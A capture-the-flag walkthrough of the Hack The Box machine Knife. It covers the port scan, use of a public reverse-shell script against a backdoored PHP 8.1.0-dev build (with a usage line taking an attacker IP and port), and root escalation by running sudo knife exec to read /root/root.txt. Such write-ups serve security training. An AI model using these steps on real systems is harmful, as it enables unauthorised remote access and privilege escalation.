# CTF: [HTB Knife](https://app.hackthebox.eu/machines/Knife)
## Notes
```
10.10.10.242


scan:

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

headers:
X-Powered-By: PHP/8.1.0-dev
https://www.exploit-db.com/exploits/49933

use python script to gain shell

user.txt:[]

sudo -l shows:
User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife

sudo knife exec -E 'system("cat /root/root.txt")'

root.txt:[]
```
## Enumeration
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```
Navigate to the address
on a browser and inspect the headers. The server is running PHP 8.1.0-dev. There has been a recent exploit that abuses this version, 
allowing attackers to run arbitrary code. 
## PHP 8.1.0-dev exploit
We are going to use 
[this Python script](https://github.com/prodseanb/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py) to get a shell.
<br/><br/>
Download the script and execute.
```
Usage: python3 revshell_php_8.1.0-dev.py [target URL] [Attacker IP] [port]
```
The first flag (user.txt) is under `/home/james`.
## Privilege escalation/root flag
Run `sudo -l`.
```
User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```
It seems like we can use knife to execute with root privileges. Run this command to get the root flag.
```
sudo knife exec -E 'system("cat /root/root.txt")'
```
